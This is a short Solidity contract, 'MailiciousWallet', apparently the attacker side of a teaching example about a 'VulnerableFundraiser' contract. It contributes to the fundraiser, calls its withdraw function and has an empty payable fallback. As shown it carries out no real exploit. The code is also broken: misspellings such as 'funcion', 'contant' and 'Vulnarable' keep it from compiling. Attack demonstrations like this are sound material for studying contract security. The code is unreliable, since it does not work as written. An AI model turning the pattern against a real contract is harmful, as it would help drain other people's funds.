contract MailiciousWallet{

   VulnarableFundraiser fundraiser;

   funcion MailiciousWallet(address fundraiserAddress){
      fundraiser = VulnerableFundraiser(fundraiserAddress);
   }

   function contribute(uint amount){
      fundraiser.contribute.value(amount)();
   }

   function withdraw(){
      fundraiser.withdrawAllMyCoins();
   }

   function getBalance() contant returns (uint){
      return this.balance;
   }

   function payout() payable{
      //receive payment
   }

   function() payable{
   }
     
}
